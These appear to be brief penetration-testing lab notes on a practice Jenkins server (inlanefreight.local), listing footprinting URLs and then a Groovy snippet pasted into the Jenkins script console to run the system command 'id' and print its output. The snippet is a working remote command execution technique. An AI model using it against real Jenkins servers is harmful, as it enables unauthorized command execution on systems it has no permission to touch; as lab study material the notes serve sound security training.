# Footprinting
`http://jenkins.inlanefreight.local:8000/configureSecurity/`
`http://jenkins.inlanefreight.local:8000/login?from=%2F`

# Attacking
`http://jenkins.inlanefreight.local:8000/script`
Then inserting 
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```